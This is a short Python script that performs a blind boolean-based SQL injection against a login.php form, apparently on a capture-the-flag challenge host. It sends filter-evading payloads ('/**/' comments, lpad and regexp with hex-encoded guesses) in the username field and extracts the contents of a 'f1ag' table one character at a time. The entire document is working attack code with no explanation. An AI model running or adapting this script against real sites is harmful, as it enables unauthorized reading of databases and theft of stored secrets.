import requests
import string
import binascii

result = ''

url = "http://eci-2zeewljwkxv9wq525ktl.cloudeci1.ichunqiu.com/login.php"
payload = 'username=admin1"/**/||case/**/when/**/(lpad(((select/**/group_concat(a.1)/**/from/**/(select/**/1/**/union/**/select/**/*/**/from/**/f1ag)/**/as/**/a)),{}))/**/regexp/**/{}/**/then/**/1/**/else/**/0/**/end%23&password=1'
headers = {
'Content-Type':'application/x-www-form-urlencoded'
}

for k in range(1,50):
    print(k)
    for i in string.printable:
        if i in '*+.?|$':
            continue
        data = payload.format(str(k),'0x' + binascii.b2a_hex((result + i).encode()).decode())
        web = requests.post(url,data,headers=headers)
        #print(data)
        if 'home' in web.text:
            result += i
            print(result)
            break